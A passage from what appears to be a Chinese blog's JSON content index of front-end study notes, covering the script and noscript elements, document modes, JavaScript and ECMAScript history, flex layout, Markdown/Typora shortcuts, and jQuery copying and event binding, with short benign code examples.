在编写JavaScript时，小于号`<`会被解释成一个标签的开始，并且由于作为开始标签的小于号后面不能有空格，所以`if(a < b)`这样的代码会报错；以下是避免这种错误的方法：\n\n  * 把所有小于号`<`都替换成对应的HTML实体形式`&lt;`，即`if(a &lt; b)`\n\n  * 把所有代码都包含到一个CDATA块中\n\n    > 在XHTML/XML中，CDATA块表示文档中可以包含任意文本的区块，其内容不作为标签来解析，因此可以在其中包含任意字符\n\n    ~~~html\n    <script type='text/javascript'><![CDATA[\n            function compare(a , b){\n                if(a < b){\n                    console.log(\"a < b\");\n                }...\n            }\n        ]]></script>\n    ~~~\n\n  > 在兼容XHTML的浏览器中，这样能解决问题，但在不支持CDATA块的非XHTML兼容浏览器中则不行，\n  >\n  > 所以CDATA比如使用JavaScript注释来抵消：\n\n  ~~~html\n  <script type='text/javascript'>\n      //<![CDATA[\n          function compare(a , b){\n              if(a < b){\n                  console.log(\"a < b\");\n              }...\n          }\n      //]]>\n  </script>\n  ~~~\n\n  > 这种格式使用于所有现代浏览器，它不仅可以通过XHTML验证，而且对XHTML之前的浏览器也能优雅地降级\n\n  ### 2.1.6 废弃的语法\n\n  * type属性使用一个MIME类型字符串来标识`<script>`的内容，但MIME类型并没有跨浏览器标准化，即使浏览器默认使用JavaScript，在某些情况下某个无效或无法识别的MIME类型也可能导致浏览器跳过（不执行）相关代码。因此，除非你使用XHTML或`<script>`标签要求或包含非JavaScript代码，最佳做法式不指定type类型。\n\n  *  在不支持JavaScript的浏览器（特别是Mosaic）中会把`<script>`元素的内容输出到页面上，解决方案是把脚本代码块包含在一个HTML注释中\n\n    ~~~html\n    <script><!--\n    \tfunction sayHi(){\n            console.log(\"Hi!\");\n        }\n    //--></script>\n    ~~~\n\n    > 使用这种格式，Mosaic等浏览器就可以忽略`<script>`标签中的内容，而支持JavaScript的浏览器则必须识别这种模式，将其中的内容作为JavaScript来解析。\n\n    但其实这种格式以及不再必要，而且不应该使用了。在XHTML模式下，这种格式会导致脚本被忽略，因为代码处于有效的XML注释当中。\n\n\n\n## 2.2 行内代码和外部文件\n\n推荐使用外部文件：\n\n* 可维护性\n* 缓存\n  * 浏览器会根据特定的设置缓存所有外部链接的JavaScript文件\n  * 若两个页面引用到同一个文件，则该文件只需下载一次，意味着页面加载更快\n* 适应未来\n  * 不必考虑用XHTML或前面提到的注释\n  * 外部JavaScript的语法在HTML和XHTML中是一样的\n\n 在初次请求时，如果浏览器支持SPDY/HTTP2，就可以从一个地方取得一批文件，并将它们逐个放到浏览器缓存中。通过SPDY/HTTP2获取所有这些独立的资源与获取一个大JavaScript文件的延迟差不多。\n\n在第二个页面请求时，由于已经把应用程序切换成了轻量可缓存的文件，第二个页面也依赖的某些组件此时已经存在浏览器缓存中了。\n\n\n\n## 2.3 文档模式\n\nIE5.5发明了文档模式，即可以使用doctype切换文档；\n\n最初的文档模式有两种：**混杂模式**和**标准模式**\n\n> 这两种模式的区别只体现在通过CSS渲染的内容方面，对JavaScript也有一些关联影响，或称为副作用。\n\n后来又出现了第3种文档模式：**准标准模式**\n\n> 这种模式下的浏览器支持很多标准的特性，但是没有标准规定的那么严格；\n>\n> 主要区别在如何对待图片元素周围的空白（在表格中使用图片时最明显）\n\n1. **混杂模式**：在所有浏览器中都以省略文档开头的doctype声明作为开关，这种约定不合理，因为混杂模式在不同浏览器中的差异很大，不使用黑科技基本上就没有浏览器一致性可言。\n\n2. **标准模式**：通过下列几种文档类型声明开启\n\n   * ~~~html\n     <!-- HTML 4.01 Strict -->\n     <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \n     \"http://www.w3.org/TR/html4/strict.dtd\">\n     ~~~\n\n   * ~~~html\n     <!-- XHTML 1.0 Strict -->\n     <!DOCTYPE HTML PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \n     \"http://www.w3.org/TR/xhtml1/DTD/xhtml-strict.dtd\">\n     ~~~\n\n   * ~~~html\n     <!-- HTML5 -->\n     <!DOCTYPE html> \n     ~~~\n\n3. **准标准模式**：通过过滤性文档类型（Transitional）和框架集文档类型（Frameset）来触发\n\n   * ~~~html\n     <!-- HTML 4.01 Transitional -->\n     <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \n     \"http://www.w3.org/TR/html4/loose.dtd\">\n     ~~~\n\n   * ~~~html\n     <!-- HTML 4.01 Frameset -->\n     <!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Frameset//EN\" \n     \"http://www.w3.org/TR/html4/frameset.dtd\">\n     ~~~\n\n   * ~~~html\n     <!-- XHTML 4.01 Transitional -->\n     <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \n     \"http://www.w3.org/TR/xhtml1/DTD/xhtml-transitional.dtd\">\n     ~~~\n\n   * ~~~html\n     <!-- XHTML 1.0 Frameset -->\n     <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Frameset//EN\" \n     \"http://www.w3.org/TR/xhtml1/xhtml1-frameset.dtd\">\n     ~~~\n\n> 准标准模式和标准模式非常接近，很少需要区分，而本书后面所说的标准模式，指的是除混杂模式之外的模式\n\n## 2.4 `<noscript>`元素\n\n针对早期浏览器不支持JavaScript的问题，需要一个页面优雅降级的处理方案。\n\n`<noscript>`元素即用于给不支持JavaScript的浏览器提供替代内容。\n\n> 虽然先浏览器已经100%支持JavaScript，但对于禁用JavaScript的浏览器来说，这个元素仍然有它的用处\n\n`<noscript>`元素可以包含任何可以出现在`<body>`中的html元素（除`<script>`）;\n\n当满足如下任一条件时，浏览器将显示包含在`<noscript>`的内容：\n\n* 浏览器不支持脚本\n* 浏览器对脚本的支持被关闭\n\n\n\n## 2.5 小结\n\nJavaScript是通过`<script>`元素插入到html页面中的：\n\n* 要包含外部JavaScript文件，必须将src属性设置为要包含文件的url。文件可以跟网页在同一台服务器上，也可以位于完全不同的域\n* 所有`<script>`元素会依照它们在网页中出现的次序被解释，在不使用`defer`和`async`时，包含在`<script>`的代码必须严格按次序解释\n* 对不推迟执行的脚本，浏览器必须解释完位于`<script>`元素的代码，然后才能继续渲染页面的剩余部分。为此，通常把此元素放到页面末尾\n* 可以使用`defer`属性把脚本推迟到文档渲染完毕后再执行。推迟脚本的原则上按照次序执行\n* 可以使用`async`属性表示不需要等待其他脚本，同时也不阻塞文档渲染，即异步加载。异步脚本不能保证按照次序执行\n* 通过使用`<noscript>`元素，可以指定在浏览器不支持脚本时显示的内容。如果浏览器支持，则`<noscript>`元素中的任何内容都不会被渲染\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["js"],"categories":["readNotes"]},{"title":"红宝书 - 第1章 什么是JavaScript","url":"/readNotes/1.什么是JavaScript","content":"\n\n## 1.1 简短的历史回顾\n\n* <font color='blue'>初想法——</font>1995年，网景公司的Brendan Eich的工程师，开始为即将发布的Netscape Navigator2开发一个叫`Mocha`(后来改名为`LiveScript`)的脚本语言，当时计划在客户端和服务器端都使用它，在服务端叫`LiveWire`.\n\n* <font color='blue'>发布1.0——</font>为赶上发布时间，网景与Sun结为开发联盟，共同完成`LiveScript`的开发，在Netscape Navigator2正式发布前，网景把`LiveScript` 改名为`JavaScript`(搭上媒体当时炒作Java的顺风车)\n\n* <font color='blue'>发布1.1、竞争——</font>`JavaScript1.0`很成功，网景又在Netscape Navigator3发布了1.1版本，不久后微软发布了IE3，其中包含自己名为`JScript`的`JavaScript`实现\n\n  > 意味着出现了两个版本的`JavaScript`：Netscape Navigator中的`JavaScript`、IE中的`JScript`\n\n* <font color='blue'>打造标准->es——</font>1997年，`JavaScript`作为提案被提交给欧洲计算机制造商协会(Ecma)。第39技术委员会(TC39)承担了“标准化一门通用、跨平台、厂商中立的脚本语言的语法和语义”的任务(参见`TC39-ECMAScript`)。\n\n  > TC39委员会由来自网景、Sun、微软、Borland、Nombas和其他对这门脚本语言有兴趣的公司的工程师组成。\n\n  他们花了数月打造出ECMA-262，也就是<font color='red'>`ECMAScript`</font>这个新的脚本语言标准。\n\n* <font color='blue'>使用es标准——</font>1998年，国际标准化组织（ISO）和国际电工委员会（IEC）也将`ECMScript`采纳为标准（ISO/IEC-16262），自此以后，各家浏览器均以`ECMAScript`作为自己`JavaScript`实现的依据，虽然具体实现各有不同。\n\n## 1.2 JavaScript实现\n\n> 虽然`JavaScript`和`ECMAScript`基本上是同义词，但`JavaScript`远远不限于`ECMA-262`所定义的那样\n\n完整的`JavaScript`实现包括：\n\n1. <font color='red'>核心（ECMAScript）</font>\n2. <font color='red'>文档对象模型（DOM）</font>\n3. <font color='red'>浏览器对象模型（BOM）</font>\n\n### 1.2.1 ECMAScript\n\n**定义：**`ECMAScript`，即`ECMA-262`定义的语言，并不局限Web浏览器。\n\n> * 这门语言没有输入输出之类的方法。\n>\n> * `ECMA-262`将这门语言作为一个基准来定义，以便在它之上再构建更稳健的脚本语言。\n> * Web浏览器只是`ECMAScript`实现可能存在的一种**宿主环境**\n> * 宿主环境提供`ECMAScript`的基准实现和与环境自身交互必需的扩展\n> * 扩展（比如DOM）使用`ECMAScript`核心类型和语法，提供特定的于环境的额外功能。\n> * 其他宿主环境还有服务器端JavaScript平台Node.js和即将被淘汰的Adobe Flash\n\n不涉及浏览器的话，ECMA-262的定义:(在基本的层面，它描述这门语言的部分：)\n\n* 语法\n* 类型\n* 语句\n* 关键字\n* 保留字\n* 操作符\n* 全局对象\n\n`ECMAScript`只是对实现这个规范描述的所有方面的一门语言的称呼。\n\n#### 1.ECMAScript版本\n\nECMAScript不同的版本以‘edition’表示（也就是描述特定实现的ECMA-262的版本），最近的版本是第10版，发布于2019年06月。\n\n1. ECMA-262第1版：本质上与网景的JavaScript1.1相同，只不过删除了所有浏览器特定的代码，外加少量细微的修改\n\n   > ECMA-262要求支持Unicode标准，以支持多语言，而且对象要与平台无关。但Netscape JavaScript1.1的对象不是这样的，比如Date对象就依赖平台。这也是JavaScript1.1和JavaScript1.2不符合ECMA-262第1版的原因\n\n2. ECMA-262第2版：做了一些编校工作，主要是为了更新之后严格符合ISO/IEC-16262的要求，并没有增减或改变任何特性 \n\n   > ECMAScript实现通常不使用第2版来衡量符合性\n\n3. ECMA-262第3版：第一次真正对这个标准进行更新，更新了字符串处理、错误定义和数值输出，还增加了对正则表达式、新的控制语句、try/catch异常处理的支持，以及为了更好地让国际化所做的少量修改\n\n4. ECMA-262第4版：是对这门语言的一次彻底修订。Ecma39再次被召集起来，几乎在第3版的基础上完全定义了一门新语言。包括强类型变量、新语句、数据结构、真正的类、经典的继承、操作数据的新手段。因为跳跃太大，所以在正式发布前就被放弃了\n\n5. ECMA-262第5版：Ecma39在研究第4版的同时也提出了‘ECMAScript3.1’，只对这门语言进行较少的改进，只要在现有JavaScript引擎基础上做一些增改就可以实现，最终ES3.1变成了ECMA-262的第5版，其致力于厘清第3版存在的歧义，也增加了新功能。包括**原生的解析**和**序列化JOSN数据的json对象**、**方便继承和高级属性定义的方法**、**新的增强ECMAScript引擎解释**和**执行代码能力的严格模式**\n\n6. ECMA-262第6版：ES6、ES2015、ES Harmony（和谐版），于2015年6月发布。这一版包含了大概这个规范有史以来最重要的一批增强特性。ES6正式支持了**类**、**模块**、**迭代器**、**生成器**、**箭头函数**、**期约**、**反射**、**代理**和**众多新的数据类型**。\n\n7. ECMA-262第7版：ES7、ES2016，于2016年6月发布，这次修订只包含少量语法层面的增强，如**Array.proptotype.includes**和**指数操作符****.\n\n8. ECMA-262第8版：ES8、ES2017，完成于2017年6月，这一版主要增加了**异步函数**(async/await)、**SharedArrayBuffer**及**Atomics API**，以及Objec**t.values() / Object.entries() / Object.getOwnPropertyDescriptors()** 和**字符串填充方法**，另外明确**支持对象字面量最后的逗号**。\n\n9. ECMA-262第9版：ES9、ES2018，发布于2018年6月，这次修订包括**异步迭代**、**剩余和扩展属性**、**一组新的正则表达式特性**、**Promise finally()**，以及**模板字面量修改**。\n\n10. ECMA-262第10版：ES10、ES2019，发布于2019年6月，这次修订增加了**Array.prototype.flat() / flatMap()** 、 **String.prototype.trimStart() / trimEnd()** **、Object.fromEntries() 方法**，以及**Symbol.prototype.description属性**，**明确定义了Function.prototype.toString() 的返回值值并固定了Array.prototype.sort() 的顺序**。解决了**JSON字符串兼容的问题**，并**定义了catch子句的可选绑定**。\n\n#### 2.ECMAScript符合性是什么意思\n\nECMA-262阐述了什么是ECMAScript符合性，要成为ECMAScript实现，必须满足：\n\n1. 支持ECMA-262中描述的所有“类型、值、对象、属性、函数，以及程序语法与语义”；\n2. 支持Unicode字符标准\n\n此外，符合性实现还可以满足下列要求：\n\n1. 增加ECMA-262中未提及的“额外的类型、值、对象、属性和函数”。ECMA-262所说的这些额外内容主要指规范中未给出的新对象或对象的新属性\n2. 支持ECMA-262中，没有定义的“程序和正则表达式语法”(允许修改和扩展内置的正则表达式特性)\n\n#### 3. 浏览器对ECMAScript的支持\n\n| 浏览器                        | ECMAScript符合性 |\n| ----------------------------- | ---------------- |\n| Netscape Navigator2           | —                |\n| Netscape Navigator3           | —                |\n| Netscape Navigator4~4.05      | —                |\n| Netscape Navigator4.06~4.79   | 第1版            |\n| Netscape 6+（Mozilla 0.6.0+） | 第3版            |\n| IE3~4                         | —                |\n| IE5                           | 第1版            |\n| IE5.5~8                       | 第3版            |\n| IE9                           | 第5版（部分）    |\n| IE10~11                       | 第5版            |\n| Edge12+                       | 第6版            |\n| Opera6~7.1                    | 2                |\n| Opera7.2+                     | 3                |\n| Opera15~28                    | 5                |\n| Opera29~35                    | 6（部分）        |\n| Opera36+                      | 6                |\n| Safari1~2.0.x                 | 第3版（部分）    |\n| Safari3.1~5.1                 | 第5版（部分）    |\n| Safari6~8                     | 第5版            |\n| Safari9+                      | 第6版            |\n| iOS Safari3.2~5.1             | 5（部分）        |\n| iOS Safari6~8.4               | 5                |\n| iOS Safari9.2+                | 6                |\n| Chrome1~3                     | 第3版            |\n| Chrome4~22                    | 第5版（部分）    |\n| Chrome23+                     | 第5版            |\n| Chrome42~48                   | 第6版（部分）    |\n| Chrome79+                     | 第6版            |\n| Firefox1~2                    | 3                |\n| Firefox3.0.x~20               | 5（部分）        |\n| Firefox21~44                  | 5                |\n| Firefox45+                    | 6                |\n\n\n\n### 1.2.2 DOM\n\n**文档对象模型**（DOM，Document Object Model）是一个应用程序接口（API），用于在HTML中使用扩展的XML。DOM将整个页面抽象为一组分层节点。HTML或XML页面的每个组成部分都是一种节点，包含不同的数据。\n\n> DOM通过创建表示文档的树，让开发者可以随心所欲地控制网页的内容和结构。使用DOM API，可以轻松的删除、添加、替换、修改节点。\n\n#### 1.为什么DOM是必需的\n\n在IE4和Netscape Navigator4支持不同形式的动态HTML（DHTML）的情况下，开发者首先可以做到不刷新页面而修改页面外观和内容。为了保持Web跨平台性，万维网联盟（W3C，World Wide Web Consortium）开始制定DOM标准的进程。\n\n#### 2.DOM级别\n\n1. 1998年10月，**DOM Level 1** 成为W3C的推荐标准。由以下两个模块组成：\n\n* DOM Core  ： 映射XML文档，从而方便访问和操作文档任意部分的方式\n* DOM HTML  ：扩展了Core，并增加了特定于HTML的对象和方法\n\n2. DOM Level 1 的目标是映射文档结构，而**DOM Level 2**的目标则宽泛得多。对最初DOM的扩展增加了<u>对（DHTML早就支持的）鼠标和用户界面事件、范围、遍历的支持</u>，而且<u>通过对象接口支持了层叠样式表CSS</u>。DOM Level 1 中的DOM Core也<u>被扩展以包含对XML命名空间的支持</u>。\n\n​       DOM Level 2新增了以下模块，以支持新的接口\n\n* DOM视图：描述追踪文档不同视图（如应用CSS样式前后的文档）的接口\n* DOM事件：描述事件及事件处理接口\n* DOM样式：描述处理元素CSS样式的接口\n* DOM遍历和范围：描述遍历和操作DOM树的接口\n\n3. **DOM Level 3**进一步扩展了DOM，增加了以统一的方式加载和保存文档的方法（包含在一个叫DOM Load and Save的新模块中），还有验证文档的方法（DOM Validation）。在Level3中，DOM Core经过扩展支持了所有XML1.0的特性，包括XML Infoset、XPath 和 XML Base\n4. 目前，W3C不再按照Level来维护DOM了，而是作为DOM Living Standard来维护，其快照称为DOM4，DOM4新增的内容包括替代Mutation Events的Mutation Observers\n\n#### 3.其他DOM\n\n> 除了DOM Core和DOM HTML接口，有些其他语言也发布了自己的DOM标准。\n\n以下语言均基于XML，每一种都增加了该语言独有的DOM方法和接口：\n\nW3C推荐标准：\n\n* 可伸缩矢量图（SVG，Scalable Vector Graphics）\n* 数学标记语言（MathML，Mathematical Markup Language）\n* 同步多媒体集成语言（SMIL，Synchronization Multimedia Integration Language）\n\n非W3C推荐的标准：\n\n* Mozilla的XML用户界面语言（XUL，XML　User　Interface　Language）\n\n#### ４.Web浏览器对DOM的支持情况\n\n\n| 浏览器                        | DOM兼容                                       |\n| ----------------------------- | --------------------------------------------- |\n| Netscape Navigator１～４.ｘ   | —                                             |\n| Netscape 6+（Mozilla 0.6.0+） | Level１、Level２（几乎全部）、Level３（部分） |\n| IE２～4.ｘ                    | —                                             |\n| IE5                           | Level１（很少）                               |\n| IE5.5~8                       | Level１（几乎全部）                           |\n| IE９＋                        | Level１、Level２、Level３                     |\n| Edge                          | Level１、Level２、Level３                     |\n| Opera１～６                   | —                                             |\n| Opera7～８.ｘ                 | Level１（几乎全部）、Level２（部分）          |\n| Opera９～９.９                | Level１、Level２（几乎全部）、Level３（部分） |\n| Opera１０＋                   | Level１、Level２、Level３（部分）             |\n| Safari１.０.ｘ                | Level１                                       |\n| Safari２＋                    | Level１、Level２（全部）、Level３（部分）     |\n| iOS Safari3.２＋              | Level１、Level２（全部）、Level３（部分）     |\n| Chrome1＋                     | Level１、Level２（全部）、Level３（部分）     |\n| Firefox1＋                    | Level１、Level２（几乎全部）、Level３（部分） |\n\n### 1.2.3 BOM\n\n**浏览器对象模型**（BOM）API，用于支持访问和操作浏览器的窗口。\n\n> 它是唯一一个没有相关标准的JavaScript实现。后来html5以正式规范的形式涵盖了尽可能多的DOM特性\n\nBOM主要针对浏览器窗口和子窗口（frame），通常人们会把任何特定于浏览器的扩展都归在BOM的范畴内，下面就是这样一些扩展：\n\n* 弹出新浏览器窗口的能力\n* 移动、缩放和关闭浏览器窗口的能力\n* navigator对象，提供关于浏览器的详尽信息\n* location对象，提供浏览器加载页面的详尽信息\n* screen对象，提供关于用户屏幕分辨率的详尽信息\n* performance对象，提供浏览器内存占用，导航行为和事件统计的详尽信息\n* 对cookie的支持\n* 其他自定义对象，如XMLHttpRequest和IE的ActiveXObject\n\n\n\n## 1.3 JavaScript版本\n\n| 浏览器                       | JavaScript版本 |\n| ---------------------------- | -------------- |\n| Netscape Navigator2          | 1.0            |\n| Netscape Navigator3          | 1.1            |\n| Netscape Navigator4          | 1.2            |\n| Netscape Navigator4.06       | 1.3            |\n| Navigator6+（Mozilla0.6.0+） | 1.5            |\n| Firefox1                     | 1.5            |\n| Firefox1.5                   | 1.6            |\n| Firefox2                     | 1.7            |\n| Firefox3                     | 1.8            |\n| Firefox3.5                   | 1.8.1          |\n| Firefox3.6                   | 1.8.2          |\n| Firefox4                     | 1.8.5          |\n\n> Netscape/Mozilla仍然沿用这种版本方案，而IE的JScript有不同的版本号规则\n>\n> 多数浏览器对JavaScript的支持，指的是实现ECMAScript和DOM的程度\n\n## 1.4 小结\n\nJavaScript是一门用来于网页交互的脚本语言，包含以下三个组成部分：\n\n* ECMAScript\n* DOM\n* BOM\n\nJavaScript的这三个部分得到了五大web浏览器（IE、Firefox、Chrome、Safari和Opera）不同程度的支持；\n\n所有浏览器基本上对ES5提供了完善的支持，对ES6和ES7的支持度也在不断提升；\n\n这些浏览器对DOM的支持各不相同，但对Level3的支持日益趋于规范；\n\nHTML5中收录的BOM会因浏览器而异，不过开发者可以假定存在很大一部分公共特性","tags":["js"],"categories":["readNotes"]},{"title":"flex 布局","url":"/learningNotes/further/flex","content":"\n#### flex 布局是什么\n\nFlex 是 Flexible Box 的缩写，意为\"弹性布局\"，用来为盒状模型提供最大的灵活性。\n\n任何一个容器都可以指定为 Flex 布局。`display: flex;`\n\n行内元素也可以使用 Flex 布局。`display: inline-flex;`\n\nWebkit 内核的浏览器，必须加上`-webkit`前缀。`display: -webkit-flex; display: flex;`\n\n> 注：设为 Flex 布局以后，子元素的`float`、`clear`和`vertical-align`属性将失效。\n\n​\t\n\n#### 基本概念\n\n采用 Flex 布局的元素，称为 **Flex 容器**（flex container），简称\"容器\"。它的所有子元素自动成为容器成员，称为 **Flex 项目**（flex item），简称\"项目\"。\n\n\n\n#### 容器的属性\n\n- flex-direction：决定主轴的方向（即项目的排列方向）\n\n  `row 默 | row-reverse | column | column-reverse;`\n\n- flex-wrap：定义,一条轴线排不下，如何换行\n\n  `nowrap 默 | wrap | wrap-reverse;`\n\n- flex-flow：是`flex-direction`属性和`flex-wrap`属性的简写形式\n\n- justify-content：定义了项目在主轴上的对齐方式\n\n  `flex-start 默 | flex-end | center | space-between | space-around;`\n\n- align-items：定义项目在交叉轴上如何对齐\n\n  `flex-start  | flex-end | center | baseline | stretch 默 `\n\n- align-content：定义了多根轴线的对齐方式，如果项目只有一根轴线，不起作用\n\n  `flex-start | flex-end | center | space-between | space-around | stretch 默`\n\n\n\n#### 项目的属性\n\n- `order`：定义项目的排列顺序。数值越小，排列越靠前，默认为0\n\n- `flex-grow`：项目的放大比例，默认为0，即如果存在剩余空间，也不放大\n\n- `flex-shrink`：性定义了项目的缩小比例，默认为1，即如果空间不足，该项目将缩小\n\n- `flex-basis`：在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为`auto`，即项目的本来大小。\n\n  `<length> | auto `\n\n- `flex`：`flex-grow`, `flex-shrink` 和 `flex-basis`的简写，默认值为`0 1 auto`。后两个属性可选\n\n- `align-self`：允许单个项目有与其他项目不一样的对齐方式，可覆盖`align-items`属性\n\n  `auto | flex-start | flex-end | center | baseline | stretch`","tags":["css"],"categories":["learningNotes"]},{"title":"markdown语法/typora使用及其快捷键","url":"/learningNotes/typora使用快捷键","content":"\n超详细：https://blog.csdn.net/SIMBA1949/article/details/79001226\n\n##### 标题\n\n’#‘ 一阶标题 ctrl+1\n\n‘##’ 二阶标题  ctrl+2\n\n…\n\n‘######’ 六阶标题 ctrl+6\n\n\n\n##### 文本居中\n\n'\\<center\\>这是要居中的文本\\<center\\>’\n<center>居中</center>\n<center>这是要居中的文本</center>\n\n##### 下划线\n\n<u>或者ctrl+u</u>\n\n##### 删除线\n\n~~或者alt+shift+5~~\n\n##### 字体加粗\n\n**或者ctrl+B 或者一对__ l**\n\n##### 字体倾斜\n\n*或者ctrl+i 或者 一对_ l*\n\n##### 字体倾斜加粗\n\n***或者用一对___ l*** \n\n##### 图片插入\n\n可直接拉入\n\n或者![]()\n\n##### 超链接\n\n<http://www.simba.com>  //<直接输入>\n\n[百度百科](www.baidu.com) //快捷健 ctrl+k  or /[自定义内容 /]/(超链接地址)\n\n* 打开本地文件时\n\n  ```java\n  [打开linkTest.md文档](./linkTest.md)\n  ```\n\n* 页内跳转\n\n  ```java\n  [链接文字](#标题文字)\n  ```\n\n  [标题](# 标题)\n\n##### 代码行\n\n一对`包住\n\n`printf(\"hello\")`\n\n##### 代码段\n\n三个`+enter /空格 +编程语言\n\n```java\nSystem.out.printf(\"hello\");\n```\n\n\n\n##### 表格使用\n\nctrl+t 会自动跳出设置行和列的设置框 \n\n使用 `|` 来分隔不同的单元格，使用 `-` 来分隔表头和其他行\n\nor |国际|省市|市区|\n\n| 国际 | 省市 | 市区 |\n| :--- | ---- | ---- |\n|      |      |      |\n\n\n\n##### 任务列表\n\n-/+/*无序列表\n\n* \n\n+ \n\n- java\n\n-[] 多选框（注意用空格隔开）\n\n- [ ] java\n\n任意数字+.+空格 有序列表\n\n1. \n\n##### 数学表达式\n\n行内：由一个美元符号将公式包起来  $cosx+sinx=1$\n\n行外：ctrl+shift+m \n$$\ncosx+sinx=1\n$$\n\n##### 上标下标\n\n可以使用^,_后跟相应符号实现\n\n$a^1$  $a_1$  $a^{32}$\n\n##### 根号\n\n可以用\\sqrt{}  \\sqrt[]{}\n\n$\\sqrt{5}$  $\\sqrt[4]{10}$\n\n##### 上下水平线\n\n\\underline{} \\overline\n\n$\\underline{a+1}$ $\\overline{a+1}$\n\n\n\n#### 更多数学公式在：https://blog.csdn.net/SIMBA1949/article/details/79001226\n\n\n\n##### 水平分割线\n\n***或 - - -（不行）\n\n***\n\n##### 引用\n\n‘>’+空格\n\n>引用\n\n##### 注释\n\n[^ 注释内容]\n\n##### 插入目录\n\n可以在输入[toc]命令的地方自动根据标签生成目录\n\n##### 导出\n\n选择文件–>导出\n\n##### 文本高亮\n\n一对==\n\n==高亮==\n\n##### 表情\n\n:单词\n\n:dancer:\n\n<img src=\"img\\typora.png\" style=\"zoom:65%; float:left;\" />\n\n\n\n#### typora与html\n\n##### 改变文字颜色\n\n用font标签改变大小及颜色\n\n<font size=2 color=\"red\">字体为red ，大小为2</font>\n\n##### 改变对齐方式\n\n<p align=\"left\">左对齐</p>\n\n<p align=\"center\">中间对齐</p>\n\n<p align=\"right\">右对齐</p>\n\n##### 插入图像\n\n通过<img scr=url />\n\n<img src=\"img/typora1.jpg\" width=100 height=100 align=left>\n\n","categories":["learningNotes"]},{"title":"04 jQuery对象","url":"/learningNotes/jquery/04jQuery对象","content":"\n\n#### 1.jQuery对象拷贝\n\n如果想要把某个对象拷贝（合并）给另一个对象使用，此时可以使用$.extend()方法\n\n**语法：**\n\n~~~javascript\n$.extend([deep]，target,object1,[objectN])\n~~~\n\n* deep：如果设为true 为深拷贝 ，默认false 浅拷贝\n* target：要拷贝的目标对象\n* object1：待拷贝到第一个对象的对象\n* objectN：待拷贝到第N个对象的对象\n* 浅拷贝是把被拷贝的对象<font color=\"red\">复杂数据类型中的地址</font>拷贝给目标对象，<u>修改目标对象 会影响被拷贝对象</u>\n* 深拷贝 前面＋true 完全克隆（拷贝的对象，而不是地址），<u>修改目标对象不会影响被拷贝对象</u>\n\n~~~javascript\n$(function(){\n    var targetObj={\n        id:0\n    };\n    var obj={\n        id:1,\n        name:\"andy\"，\n        msg:{    //!!!\n        age:18\n    }\n    };\n    $.extend(targetObj,obj);\n    console.log(targetObj); //会覆盖targetObj 里面原来的数据\n\t//1.浅拷贝是把被拷贝的对象复杂数据类型中的地址拷贝给目标对象\n\ttargetObj.msg.age=20;\n\tconsole.log(targetObj);  //msg.age=20\n\tconsole.log(obj); //msg.age=20\n\t//2.深拷贝把里面的数据完全复制一份给目标对象 如果里面有不冲突的属性 会合并到一起\n\t$.extend(true,targetObj,obj);\n\ttargetObj.msg.age=20;\n\tconsole.log(targetObj);  //msg.age=20\n\tconsole.log(obj); //msg.age=18\n})\n~~~\n\n<img src=\"https://s1.328888.xyz/2022/04/09/Xkq6O.png\" style=\"zoom:70%;\" align=\"left\" />\n\n#### 2.多库共存\n\n<img src=\"https://s1.328888.xyz/2022/04/09/XkzdS.png\" style=\"zoom:60%;\" align=\"left\" />\n\n~~~javascript\n$(function(){\n    function $(ele){   //把$用在这个函数上\n        return document.querySelector(ele);\n    }\n    console.log($(\"div\"));\n    //1.如果$符号冲突 我们就用jQuery 代替$\n    //$.each(); 这个不能用 因为$.each()不是一个函数 $被占用\n    jQuery.each();\n    //2.让jQuery 释放对$ 的控制权 让用自己命名的东西\n    var suibian=jQuery.noConflict();\n    console.log(suibian(\"span\"));\n    suibian.each();\n})\n~~~\n\n#### 3.jQuery插件\n\n<img src=\"https://s1.328888.xyz/2022/04/09/Xktbm.png\" style=\"zoom:70%;\" align=\"left\" />\n\n<img src=\"https://s1.328888.xyz/2022/04/09/XkWyA.png\" style=\"zoom:70%;\" align=\"left\" />\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["jQuery"],"categories":["learningNotes"]},{"title":"03 jQuery事件","url":"/learningNotes/jquery/03jQuery事件","content":"\n\n#### 1.jQuery事件注册\n\n##### 单个注册事件\n\n**语法：**\n\n~~~javascript\nelement.事件(function(){})\n\n$(\"div\").click(function(){ 事件处理程序 })\n~~~\n\n其他事件跟原生基本一致\n\n比如：mouseover、mouseout、blur、focus、change、keydown、keyup、resize、scroll等\n\n~~~javascript\n$(function(){\n    //1.单个事件注册\n    $(\"div\").click(function(){\n        $(this).css(\"background\",\"purple\");\n    });\n    $(\"div\").mouseenter(function(){\n        $(this).css(\"background\",\"skyblue\");\n    });\n})\n~~~\n\n#### 2.jQuery事件处理\n\n##### 2.1事件处理on()绑定事件\n\non() 方法在匹配元素上绑定一个或多个事件处理函数\n\n**语法：**\n\n~~~javascript\nelement.on(events,[selector],fn)\n~~~\n\n* events：一个或多个用空格分隔的事件类型，如“click”或“keydown”\n\n* selector：元素的子元素选择器\n\n* fn：回调函数 即绑定在元素身上的监听函数\n\n  <img src=\"https://s1.328888.xyz/2022/04/09/XkpPi.png\" style=\"zoom:67%;\" align=\"left\" />\n\n  <img src=\"https://s1.328888.xyz/2022/04/09/XksAv.png\" style=\"zoom:67%;\" align=\"left\" />\n\n  <img src=\"https://s1.328888.xyz/2022/04/09/Xk7Y0.png\" style=\"zoom:67%;\" align=\"left\" />\n\n~~~javascript\n//2.事件处理on\n//优势1 on可以绑定1个或多个事件处理程序\n$(\"div\").on({\n    mouseenter:function(){\n        $(this).css(\"background\",\"skyblue\");\n    },\n    click:function(){\n        $(this).css(\"background\",\"purple\");\n    },\n    mouseleave:function(){\n        $(this).css(\"background\",\"blue\");\n    }\n})\n//优势1 if事件处理程序相同\n$(\"div\").on(\"mouseenter mouseleave\",function(){\n    $(this).toggleClass(\"current\");\n})\n\n//优势2 